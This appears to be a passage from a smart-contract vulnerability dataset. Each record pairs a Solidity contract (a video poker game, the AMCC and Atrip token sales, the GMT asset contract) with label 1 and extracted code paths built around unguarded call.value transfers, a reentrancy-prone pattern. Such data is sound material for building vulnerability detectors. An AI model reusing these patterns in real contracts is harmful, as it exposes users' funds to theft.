uint32 indexed id, uint amount); event CreditsUsed(uint time, address indexed user, uint32 indexed id, uint amount); event CreditsCashedout(uint time, address indexed user, uint amount); constructor(address _registry) Bankrollable(_registry) UsingAdmin(_registry) public { _addPayTable(800, 50, 25, 9, 6, 4, 3, 2, 1); vars.curId = 293; vars.totalWageredGwei =2864600000; vars.curUserId = 38; vars.totalWonGwei = 2450400000; settings.minBet = .001 ether; settings.maxBet = .375 ether; emit Created(now); } function changeSettings(uint64 _minBet, uint64 _maxBet, uint8 _payTableId) public fromAdmin { require(_maxBet <= .375 ether); require(_payTableId < settings.numPayTables); settings.minBet = _minBet; settings.maxBet = _maxBet; settings.curPayTableId = _payTableId; emit SettingsChanged(now, msg.sender); } function addPayTable( uint16 _rf, uint16 _sf, uint16 _fk, uint16 _fh, uint16 _fl, uint16 _st, uint16 _tk, uint16 _tp, uint16 _jb ) public fromAdmin { uint32 _today = uint32(block.timestamp / 1 days); require(settings.lastDayAdded < _today); settings.lastDayAdded = _today; _addPayTable(_rf, _sf, _fk, _fh, _fl, _st, _tk, _tp, _jb); emit PayTableAdded(now, msg.sender, settings.numPayTables-1); } function addCredits() public payable { _creditUser(msg.sender, msg.value, 0); } function cashOut(uint _amt) public { _uncreditUser(msg.sender, _amt); } function bet() public payable { uint _bet = msg.value; if (_bet > settings.maxBet) return _betFailure(\"Bet too large.\", _bet, true); if (_bet < settings.minBet) return _betFailure(\"Bet too small.\", _bet, true); if (_bet > curMaxBet()) return _betFailure(\"The bankroll is too low.\", _bet, true); uint32 _id = _createNewGame(uint64(_bet)); emit BetSuccess(now, msg.sender, _id, _bet, settings.curPayTableId); } function betWithCredits(uint64 _bet) public { if (_bet > settings.maxBet) return _betFailure(\"Bet too large.\", _bet, false); if (_bet < settings.minBet) return _betFailure(\"Bet too small.\", _bet, false); if (_bet > curMaxBet()) return _betFailure(\"The bankroll is too low.\", _bet, false); if (_bet > credits[msg.sender]) return _betFailure(\"Insufficient credits\", _bet, false); uint32 _id = _createNewGame(uint64(_bet)); vars.totalCredits -= uint88(_bet); credits[msg.sender] -= _bet; emit CreditsUsed(now, msg.sender, _id, _bet); emit BetSuccess(now, msg.sender, _id, _bet, settings.curPayTableId); } function betFromGame(uint32 _id, bytes32 _hashCheck) public { bool _didFinalize = finalize(_id, _hashCheck); uint64 _bet = games[_id].bet; if (!_didFinalize) return _betFailure(\"Failed to finalize prior game.\", _bet, false); betWithCredits(_bet); } function _betFailure(string _msg, uint _bet, bool _doRefund) private { if (_doRefund) require(msg.sender.call.value(_bet)()); emit BetFailure(now, msg.sender, _bet, _msg); } function draw(uint32 _id, uint8 _draws, bytes32 _hashCheck) public { Game storage _game = games[_id]; address _user = userAddresses[_game.userId]; if (_game.iBlock == 0) return _drawFailure(_id, _draws, \"Invalid game Id.\"); if (_user != msg.sender) return _drawFailure(_id, _draws, \"This is not your game.\"); if (_game.iBlock == block.number) return _drawFailure(_id, _draws, \"Initial cards not available.\"); if (_game.dBlock != 0) return _drawFailure(_id, _draws, \"Cards already drawn.\"); if (_draws > 31) return _drawFailure(_id, _draws, \"Invalid draws.\"); if (_draws == 0) return _drawFailure(_id, _draws, \"Cannot draw 0 cards. Use finalize instead.\"); if (_game.handRank != HAND_UNDEFINED) return _drawFailure(_id, _draws, \"Game already finalized.\"); _draw(_game, _id, _draws, _hashCheck); } function _drawFailure(uint32 _id, uint8 _draws, string _msg) private { emit DrawFailure(now, msg.sender, _id, _draws, _msg); } function finalize(uint32 _id, bytes32 _hashCheck) public returns (bool _didFinalize) { Game storage _game = games[_id]; address _user = userAddresses[_game.userId]; if (_game.iBlock == 0) return _finalizeFailure(_id, \"Invalid game Id.\"); if (_user != msg.sender) return _finalizeFailure(_id, \"This is not your game.\"); if (_game.iBlock == block.number) return _finalizeFailure(_id, \"Initial hand not avaiable.\"); if (_game.dBlock == block.number) return _finalizeFailure(_id, \"Drawn cards not available.\"); if (_game.handRank != HAND_UNDEFINED) return _finalizeFailure(_id, \"Game already finalized.\"); _finalize(_game, _id, _hashCheck); return true; } function _finalizeFailure(uint32 _id, string _msg) private returns (bool) { emit FinalizeFailure(now, msg.sender, _id, _msg); return false; } function _addPayTable( uint16 _rf, uint16 _sf, uint16 _fk, uint16 _fh, uint16 _fl, uint16 _st, uint16 _tk, uint16 _tp, uint16 _jb ) private { require(_rf<=1600 && _sf<=100 && _fk<=50 && _fh<=18 && _fl<=12 && _st<=8 && _tk<=6 && _tp<=4 && _jb<=2); uint16[12] memory _pt; _pt[HAND_UNDEFINED] = 0; _pt[HAND_RF] = _rf; _pt[HAND_SF] = _sf; _pt[HAND_FK] = _fk; _pt[HAND_FH] = _fh; _pt[HAND_FL] = _fl; _pt[HAND_ST] = _st; _pt[HAND_TK] = _tk; _pt[HAND_TP] = _tp; _pt[HAND_JB] = _jb; _pt[HAND_HC] = 0; _pt[HAND_NOT_COMPUTABLE] = 0; payTables[settings.numPayTables] = _pt; settings.numPayTables++; } function _creditUser(address _user, uint _amt, uint32 _gameId) private { if (_amt == 0) return; uint64 _incr = _gameId == 0 ? 0 : uint64(_amt / 1e9); uint88 _totalCredits = vars.totalCredits + uint88(_amt); uint64 _totalWonGwei = vars.totalWonGwei + _incr; vars.totalCredits = _totalCredits; vars.totalWonGwei = _totalWonGwei; credits[_user] += _amt; emit CreditsAdded(now, _user, _gameId, _amt); } function _uncreditUser(address _user, uint _amt) private { if (_amt > credits[_user] || _amt == 0) _amt = credits[_user]; if (_amt == 0) return; vars.totalCredits -= uint88(_amt); credits[_user] -= _amt; require(_user.call.value(_amt)()); emit CreditsCashedout(now, _user, _amt); } function _createNewGame(uint64 _bet) private returns (uint32 _curId) { uint32 _curUserId = vars.curUserId; uint32 _userId = userIds[msg.sender]; if (_userId == 0) { _curUserId++; userIds[msg.sender] = _curUserId; userAddresses[_curUserId] = msg.sender; _userId = _curUserId; } _curId =  vars.curId + 1; uint64 _totalWagered = vars.totalWageredGwei + _bet / 1e9; vars.curId = _curId; vars.totalWageredGwei = _totalWagered; vars.curUserId = _curUserId; uint16 _payTableId = settings.curPayTableId; Game storage _game = games[_curId]; _game.userId = _userId; _game.bet = _bet; _game.payTableId = _payTableId; _game.iBlock = uint32(block.number); return _curId; } function _draw(Game storage _game, uint32 _id, uint8 _draws, bytes32 _hashCheck) private { assert(_game.dBlock == 0); uint32 _iHand; bytes32 _iBlockHash = blockhash(_game.iBlock); uint8 _warnCode; if (_iBlockHash != 0) { if (_iBlockHash != _hashCheck) { return _drawFailure(_id, _draws, \"HashCheck Failed. Try refreshing game.\"); } _iHand = getHand(uint(keccak256(_iBlockHash, _id))); } else { _warnCode = WARN_IHAND_TIMEOUT; _draws = 31; } _game.iHand = _iHand; _game.draws = _draws; _game.dBlock = uint32(block.number); emit DrawSuccess(now, msg.sender, _id, _game.iHand, _draws, _warnCode); } function _finalize(Game storage _game, uint32 _id, bytes32 _hashCheck) private { assert(_game.handRank == HAND_UNDEFINED); address _user = userAddresses[_game.userId]; bytes32 _blockhash; uint32 _dHand; uint32 _iHand; uint8 _warnCode; if (_game.draws != 0) { _blockhash = blockhash(_game.dBlock); if (_blockhash != 0) { _dHand = drawToHand(uint(keccak256(_blockhash, _id)), _game.iHand, _game.draws); } else { if (_game.iHand != 0){ _dHand = _game.iHand; _warnCode = WARN_DHAND_TIMEOUT; } else { _dHand = 0; _warnCode = WARN_BOTH_TIMEOUT; } } } else { _blockhash = blockhash(_game.iBlock); if (_blockhash != 0) { if (_blockhash != _hashCheck) { _finalizeFailure(_id, \"HashCheck Failed. Try refreshing game.\"); return; } _iHand = getHand(uint(keccak256(_blockhash, _id))); _dHand = _iHand; } else { _finalizeFailure(_id, \"Initial hand not available. Drawing 5 new cards.\"); _game.draws = 31; _game.dBlock = uint32(block.number); emit DrawSuccess(now, _user, _id, 0, 31, WARN_IHAND_TIMEOUT); return; } } uint8 _handRank = _dHand == 0 ? uint8(HAND_NOT_COMPUTABLE) : uint8(getHandRank(_dHand)); if (_iHand > 0) _game.iHand = _iHand; _game.dHand = _dHand; _game.handRank = _handRank; uint _payout = payTables[_game.payTableId][_handRank] * uint(_game.bet); if (_payout > 0) _creditUser(_user, _payout, _id); emit FinalizeSuccess(now, _user, _id, _game.dHand, _game.handRank, _payout, _warnCode); } function getCollateral() public view returns (uint _amount) { return vars.totalCredits; } function getWhitelistOwner() public view returns (address _wlOwner) { return getAdmin(); } function curMaxBet() public view returns (uint) { uint _maxPayout = payTables[settings.curPayTableId][HAND_RF] * 2; return bankrollAvailable() / _maxPayout; } function effectiveMaxBet() public view returns (uint _amount) { uint _curMax = curMaxBet(); return _curMax > settings.maxBet ? settings.maxBet : _curMax; } function getPayTable(uint16 _payTableId) public view returns (uint16[12]) { require(_payTableId < settings.numPayTables); return payTables[_payTableId]; } function getCurPayTable() public view returns (uint16[12]) { return getPayTable(settings.curPayTableId); } function getIHand(uint32 _id) public view returns (uint32) { Game memory _game = games[_id]; if (_game.iHand != 0) return _game.iHand; if (_game.iBlock == 0) return; bytes32 _iBlockHash = blockhash(_game.iBlock); if (_iBlockHash == 0) return; return getHand(uint(keccak256(_iBlockHash, _id))); } function getDHand(uint32 _id) public view returns (uint32) { Game memory _game = games[_id]; if (_game.dHand != 0) return _game.dHand; if (_game.draws == 0) return _game.iHand; if (_game.dBlock == 0) return; bytes32 _dBlockHash = blockhash(_game.dBlock); if (_dBlockHash == 0) return _game.iHand; return drawToHand(uint(keccak256(_dBlockHash, _id)), _game.iHand, _game.draws); } function getDHandRank(uint32 _id) public view returns (uint8) { uint32 _dHand = getDHand(_id); return _dHand == 0 ? uint8(HAND_NOT_COMPUTABLE) : uint8(getHandRank(_dHand)); } function curId() public view returns (uint32) { return vars.curId; } function totalWagered() public view returns (uint) { return uint(vars.totalWageredGwei) * 1e9; } function curUserId() public view returns (uint) { return uint(vars.curUserId); } function totalWon() public view returns (uint) { return uint(vars.totalWonGwei) * 1e9; } function totalCredits() public view returns (uint) { return vars.totalCredits; } function minBet() public view returns (uint) { return settings.minBet; } function maxBet() public view returns (uint) { return settings.maxBet; } function curPayTableId() public view returns (uint) { return settings.curPayTableId; } function numPayTables() public view returns (uint) { return settings.numPayTables; } } "}
{"sol name": "21886.sol", "label": 1, "first path": "function buy(address recipient, uint256 value) public payable { if (value> msg.value) throw; if (value < msg.value) { require(msg.sender.call.value(msg.value - value)()); buyToken(recipient, value); function buyToken(address recipient, uint256 value) internal { if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw; if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw; uint tokens = safeMul(value, price()); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); totalEtherRaised = safeAdd(totalEtherRaised, value); if (block.number<=startBlock+prePeriod) { presaleTokenSupply = safeAdd(presaleTokenSupply, tokens); Transfer(address(0), recipient, tokens); if (!founder.call.value(value)()) throw; Buy(recipient, value, tokens); ", "second path": "function buy(address recipient, uint256 value) public payable { if (value> msg.value) throw; if (value < msg.value) { require(msg.sender.call.value(msg.value - value)()); buyToken(recipient, value); function buyToken(address recipient, uint256 value) internal { if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw; if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw; uint tokens = safeMul(value, price()); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); totalEtherRaised = safeAdd(totalEtherRaised, value); if (block.number<=startBlock+prePeriod) { presaleTokenSupply = safeAdd(presaleTokenSupply, tokens); Transfer(address(0), recipient, tokens); if (!founder.call.value(value)()) throw; Buy(recipient, value, tokens); ", "third path": "function buy(address recipient, uint256 value) public payable { if (value> msg.value) throw; if (value < msg.value) { require(msg.sender.call.value(msg.value - value)()); buyToken(recipient, value); function buyToken(address recipient, uint256 value) internal { if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw; if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw; uint tokens = safeMul(value, price()); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); totalEtherRaised = safeAdd(totalEtherRaised, value); if (block.number<=startBlock+prePeriod) { presaleTokenSupply = safeAdd(presaleTokenSupply, tokens); Transfer(address(0), recipient, tokens); if (!founder.call.value(value)()) throw; Buy(recipient, value, tokens); ", "long path": "pragma solidity ^0.4.18; contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function safeSub(uint a, uint b) internal returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; assert(c>=a && c>=b); return c; } function assert(bool assertion) internal { if (!assertion) throw; } } contract Token { function totalSupply() constant returns (uint256 supply) {} function balanceOf(address _owner) constant returns (uint256 balance) {} function transfer(address _to, uint256 _value) returns (bool success) {} function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {} function approve(address _spender, uint256 _value) returns (bool success) {} function allowance(address _owner, address _spender) constant returns (uint256 remaining) {} event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract StandardToken is Token { function transfer(address _to, uint256 _value) returns (bool success) { if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } mapping(address => uint256) balances; mapping (address => mapping (address => uint256)) allowed; uint256 public totalSupply; } contract AutomobileCyberchainToken is StandardToken, SafeMath { string public name = \"Automobile Cyberchain Token\"; string public symbol = \"AMCC\"; uint public decimals = 18; uint preSalePrice  = 32000; uint crowSalePrice = 20000; uint prePeriod = 256 * 24 * 30; uint totalPeriod = 256 * 24 * 95; uint public startBlock = 5455280; uint public endBlock = startBlock + totalPeriod; address public founder = 0xfD16CDC79382F86303E2eE8693C7f50A4d8b937F; uint256 public preEtherCap = 15625 * 10**18; uint256 public etherCap =    88125 * 10**18; uint256 public bountyAllocation = 1050000000 * 10**18; uint256 public maxToken = 3000000000 * 10**18; uint256 public presaleTokenSupply = 0; uint256 public totalEtherRaised = 0; bool public halted = false; event Buy(address indexed sender, uint eth, uint fbt); function AutomobileCyberchainToken() { balances[founder] = bountyAllocation; totalSupply = bountyAllocation; Transfer(address(0), founder, bountyAllocation); } function price() constant returns(uint) { if (block.number<startBlock || block.number > endBlock) return 0; else if (block.number>=startBlock && block.number<startBlock+prePeriod) return preSalePrice; else  return crowSalePrice; } function() public payable  { buyToken(msg.sender, msg.value); } function buy(address recipient, uint256 value) public payable { if (value> msg.value) throw; if (value < msg.value) { require(msg.sender.call.value(msg.value - value)()); } buyToken(recipient, value); } function buyToken(address recipient, uint256 value) internal { if (block.number<startBlock || block.number>endBlock || safeAdd(totalEtherRaised,value)>etherCap || halted) throw; if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw; uint tokens = safeMul(value, price()); balances[recipient] = safeAdd(balances[recipient], tokens); totalSupply = safeAdd(totalSupply, tokens); totalEtherRaised = safeAdd(totalEtherRaised, value); if (block.number<=startBlock+prePeriod) { presaleTokenSupply = safeAdd(presaleTokenSupply, tokens); } Transfer(address(0), recipient, tokens); if (!founder.call.value(value)()) throw; Buy(recipient, value, tokens); } function halt() { if (msg.sender!=founder) throw; halted = true; } function unhalt() { if (msg.sender!=founder) throw; halted = false; } function changeFounder(address newFounder) { if (msg.sender!=founder) throw; founder = newFounder; } function withdrawExtraToken(address recipient) public { require(msg.sender == founder && block.number > endBlock && totalSupply < maxToken); uint256 leftTokens = safeSub(maxToken, totalSupply); balances[recipient] = safeAdd(balances[recipient], leftTokens); totalSupply = maxToken; Transfer(address(0), recipient, leftTokens); } } "}
{"sol name": "39973.sol", "label": 1, "first path": "function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); function _forward(address _to, bytes _data) internal returns(bool, bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return (false, _safeFalse()); if (!_to.call.value(msg.value)(_data)) { return (false, _safeFalse()); return (true, _applyRefund(startGas)); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); ", "second path": "function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); function _forward(address _to, bytes _data) internal returns(bool, bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return (false, _safeFalse()); if (!_to.call.value(msg.value)(_data)) { return (false, _safeFalse()); return (true, _applyRefund(startGas)); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); ", "third path": "function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); function _forward(address _to, bytes _data) internal returns(bool, bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return (false, _safeFalse()); if (!_to.call.value(msg.value)(_data)) { return (false, _safeFalse()); return (true, _applyRefund(startGas)); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); ", "long path": "pragma solidity ^0.4.4; contract EtherTreasuryInterface { function withdraw(address _to, uint _value) returns(bool); function withdrawWithReference(address _to, uint _value, string _reference) returns(bool); } contract SafeMin { modifier onlyHuman { if (_isHuman()) { _; } } modifier immutable(address _address) { if (_address == 0) { _; } } function _safeFalse() internal returns(bool) { _safeSend(msg.sender, msg.value); return false; } function _safeSend(address _to, uint _value) internal { if (!_unsafeSend(_to, _value)) { throw; } } function _unsafeSend(address _to, uint _value) internal returns(bool) { return _to.call.value(_value)(); } function _isContract() constant internal returns(bool) { return msg.sender != tx.origin; } function _isHuman() constant internal returns(bool) { return !_isContract(); } } contract MultiAsset { function isCreated(bytes32 _symbol) constant returns(bool); function baseUnit(bytes32 _symbol) constant returns(uint8); function name(bytes32 _symbol) constant returns(string); function description(bytes32 _symbol) constant returns(string); function isReissuable(bytes32 _symbol) constant returns(bool); function owner(bytes32 _symbol) constant returns(address); function isOwner(address _owner, bytes32 _symbol) constant returns(bool); function totalSupply(bytes32 _symbol) constant returns(uint); function balanceOf(address _holder, bytes32 _symbol) constant returns(uint); function transfer(address _to, uint _value, bytes32 _symbol) returns(bool); function transferToICAP(bytes32 _icap, uint _value) returns(bool); function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool); function transferWithReference(address _to, uint _value, bytes32 _symbol, string _reference) returns(bool); function proxyTransferWithReference(address _to, uint _value, bytes32 _symbol, string _reference) returns(bool); function proxyTransferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool); function approve(address _spender, uint _value, bytes32 _symbol) returns(bool); function proxyApprove(address _spender, uint _value, bytes32 _symbol) returns(bool); function allowance(address _from, address _spender, bytes32 _symbol) constant returns(uint); function transferFrom(address _from, address _to, uint _value, bytes32 _symbol) returns(bool); function transferFromWithReference(address _from, address _to, uint _value, bytes32 _symbol, string _reference) returns(bool); function transferFromToICAP(address _from, bytes32 _icap, uint _value) returns(bool); function transferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool); function proxyTransferFromWithReference(address _from, address _to, uint _value, bytes32 _symbol, string _reference) returns(bool); function proxyTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool); function setCosignerAddress(address _address, bytes32 _symbol) returns(bool); function setCosignerAddressForUser(address _address) returns(bool); function proxySetCosignerAddress(address _address, bytes32 _symbol) returns(bool); } contract AssetMin is SafeMin { event Transfer(address indexed from, address indexed to, uint value); event Approve(address indexed from, address indexed spender, uint value); MultiAsset public multiAsset; bytes32 public symbol; string public name; function init(address _multiAsset, bytes32 _symbol) immutable(address(multiAsset)) returns(bool) { MultiAsset ma = MultiAsset(_multiAsset); if (!ma.isCreated(_symbol)) { return false; } multiAsset = ma; symbol = _symbol; return true; } function setName(string _name) returns(bool) { if (bytes(name).length != 0) { return false; } name = _name; return true; } modifier onlyMultiAsset() { if (msg.sender == address(multiAsset)) { _; } } function totalSupply() constant returns(uint) { return multiAsset.totalSupply(symbol); } function balanceOf(address _owner) constant returns(uint) { return multiAsset.balanceOf(_owner, symbol); } function allowance(address _from, address _spender) constant returns(uint) { return multiAsset.allowance(_from, _spender, symbol); } function transfer(address _to, uint _value) returns(bool) { return __transferWithReference(_to, _value, \"\"); } function transferWithReference(address _to, uint _value, string _reference) returns(bool) { return __transferWithReference(_to, _value, _reference); } function __transferWithReference(address _to, uint _value, string _reference) private returns(bool) { return _isHuman() ? multiAsset.proxyTransferWithReference(_to, _value, symbol, _reference) : multiAsset.transferFromWithReference(msg.sender, _to, _value, symbol, _reference); } function transferToICAP(bytes32 _icap, uint _value) returns(bool) { return __transferToICAPWithReference(_icap, _value, \"\"); } function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool) { return __transferToICAPWithReference(_icap, _value, _reference); } function __transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) private returns(bool) { return _isHuman() ? multiAsset.proxyTransferToICAPWithReference(_icap, _value, _reference) : multiAsset.transferFromToICAPWithReference(msg.sender, _icap, _value, _reference); } function approve(address _spender, uint _value) onlyHuman() returns(bool) { return multiAsset.proxyApprove(_spender, _value, symbol); } function setCosignerAddress(address _cosigner) onlyHuman() returns(bool) { return multiAsset.proxySetCosignerAddress(_cosigner, symbol); } function emitTransfer(address _from, address _to, uint _value) onlyMultiAsset() { Transfer(_from, _to, _value); } function emitApprove(address _from, address _spender, uint _value) onlyMultiAsset() { Approve(_from, _spender, _value); } function sendToOwner() returns(bool) { address owner = multiAsset.owner(symbol); return multiAsset.transfer(owner, balanceOf(owner), symbol); } function decimals() constant returns(uint8) { return multiAsset.baseUnit(symbol); } } contract Owned { address public contractOwner; function Owned() { contractOwner = msg.sender; } modifier onlyContractOwner() { if (contractOwner == msg.sender) { _; } } } contract GMT is AssetMin, Owned { uint public txGasPriceLimit = 21000000000; uint public refundGas = 40000; uint public transferCallGas = 21000; uint public transferWithReferenceCallGas = 21000; uint public transferToICAPCallGas = 21000; uint public transferToICAPWithReferenceCallGas = 21000; uint public approveCallGas = 21000; uint public forwardCallGas = 21000; uint public setCosignerCallGas = 21000; EtherTreasuryInterface public treasury; mapping(bytes32 => address) public allowedForwards; function updateRefundGas() onlyContractOwner() returns(uint) { uint startGas = msg.gas; uint refund = (startGas - msg.gas + refundGas) * tx.gasprice; if (tx.gasprice > txGasPriceLimit) { return 0; } if (!_refund(1)) { return 0; } refundGas = startGas - msg.gas; return refundGas; } function setOperationsCallGas(uint _transfer,uint _transferToICAP,uint _transferWithReference,uint _transferToICAPWithReference,uint _approve,uint _forward,uint _setCosigner) onlyContractOwner() returns(bool) { transferCallGas = _transfer; transferToICAPCallGas = _transferToICAP; transferWithReferenceCallGas = _transferWithReference; transferToICAPWithReferenceCallGas = _transferToICAPWithReference; approveCallGas = _approve; forwardCallGas = _forward; setCosignerCallGas = _setCosigner; return true; } function setupTreasury(address _treasury, uint _txGasPriceLimit) payable onlyContractOwner() returns(bool) { if (_txGasPriceLimit == 0) { return _safeFalse(); } treasury = EtherTreasuryInterface(_treasury); txGasPriceLimit = _txGasPriceLimit; if (msg.value > 0) { _safeSend(_treasury, msg.value); } return true; } function setForward(bytes4 _msgSig, address _forward) onlyContractOwner() returns(bool) { allowedForwards[sha3(_msgSig)] = _forward; return true; } function _stringGas(string _string) constant internal returns(uint) { return bytes(_string).length * 75; } function _applyRefund(uint _startGas) internal returns(bool) { if (tx.gasprice > txGasPriceLimit) { return false; } uint refund = (_startGas - msg.gas + refundGas) * tx.gasprice; return _refund(refund); } function _refund(uint _value) internal returns(bool) { return address(treasury) != 0 && treasury.withdraw(tx.origin, _value); } function _transfer(address _to, uint _value) internal returns(bool, bool) { uint startGas = msg.gas + transferCallGas; if (!super.transfer(_to, _value)) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferToICAP(bytes32 _icap, uint _value) internal returns(bool, bool) { uint startGas = msg.gas + transferToICAPCallGas; if (!super.transferToICAP(_icap, _value)) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferWithReference(address _to, uint _value, string _reference) internal returns(bool, bool) { uint startGas = msg.gas + transferWithReferenceCallGas + _stringGas(_reference); if (!super.transferWithReference(_to, _value, _reference)) { return (false, false); } return (true, _applyRefund(startGas)); } function _transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) internal returns(bool, bool) { uint startGas = msg.gas + transferToICAPWithReferenceCallGas + _stringGas(_reference); if (!super.transferToICAPWithReference(_icap, _value, _reference)) { return (false, false); } return (true, _applyRefund(startGas)); } function _approve(address _spender, uint _value) internal returns(bool, bool) { uint startGas = msg.gas + approveCallGas; if (!super.approve(_spender, _value)) { return (false, false); } return (true, _applyRefund(startGas)); } function _setCosignerAddress(address _cosigner) internal returns(bool, bool) { uint startGas = msg.gas + setCosignerCallGas; if (!super.setCosignerAddress(_cosigner)) { return (false, false); } return (true, _applyRefund(startGas)); } function transfer(address _to, uint _value) returns(bool) { bool success; (success,) = _transfer(_to, _value); return success; } function transferToICAP(bytes32 _icap, uint _value) returns(bool) { bool success; (success,) = _transferToICAP(_icap, _value); return success; } function transferWithReference(address _to, uint _value, string _reference) returns(bool) { bool success; (success,) = _transferWithReference(_to, _value, _reference); return success; } function transferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool) { bool success; (success,) = _transferToICAPWithReference(_icap, _value, _reference); return success; } function approve(address _spender, uint _value) returns(bool) { bool success; (success,) = _approve(_spender, _value); return success; } function setCosignerAddress(address _cosigner) returns(bool) { bool success; (success,) = _setCosignerAddress(_cosigner); return success; } function checkTransfer(address _to, uint _value) constant returns(bool, bool) { return _transfer(_to, _value); } function checkTransferToICAP(bytes32 _icap, uint _value) constant returns(bool, bool) { return _transferToICAP(_icap, _value); } function checkTransferWithReference(address _to, uint _value, string _reference) constant returns(bool, bool) { return _transferWithReference(_to, _value, _reference); } function checkTransferToICAPWithReference(bytes32 _icap, uint _value, string _reference) constant returns(bool, bool) { return _transferToICAPWithReference(_icap, _value, _reference); } function checkApprove(address _spender, uint _value) constant returns(bool, bool) { return _approve(_spender, _value); } function checkSetCosignerAddress(address _cosigner) constant returns(bool, bool) { return _setCosignerAddress(_cosigner); } function checkForward(bytes _data) constant returns(bool, bool) { return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data); } function _forward(address _to, bytes _data) internal returns(bool, bool) { uint startGas = msg.gas + forwardCallGas + (_data.length * 50); if (_to == 0x0) { return (false, _safeFalse()); } if (!_to.call.value(msg.value)(_data)) { return (false, _safeFalse()); } return (true, _applyRefund(startGas)); } function () payable { _forward(allowedForwards[sha3(msg.sig)], msg.data); } } "}
{"sol name": "10715.sol", "label": 1, "first path": "function approveAndCall(address _spender,  uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; function increaseApprovalAndCall(address _spender,uint _addedValue,bytes _data) public payable returns (bool) { require(_spender != address(this)); super.increaseApproval(_spender, _addedValue); require(_spender.call.value(msg.value)(_data)); return true; function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.decreaseApproval(_spender, _subtractedValue); require(_spender.call.value(msg.value)(_data)); return true; contract AtripToken is ERC827Token { using SafeMath for uint256; string public name = \"Atrip Token\"; string public symbol = \"APK\"; uint public decimals = 18; address public wallet = 0x0; ", "second path": "function approveAndCall(address _spender,  uint256 _value, bytes _data) public payable returns (bool) { require(_spender != address(this)); super.approve(_spender, _value); require(_spender.call.value(msg.value)(_data)); return true; function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transfer(_to, _value); require(_to.call.value(msg.value)(_data)); return true; function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) { require(_to != address(this)); super.transferFrom(_from, _to, _value); require(_to.call.value(msg.value)(_data)); return true; function increaseApprovalAndCall(address _spender,uint _addedValue,bytes _data) public payable returns (bool) { require(_spender != address(this)); 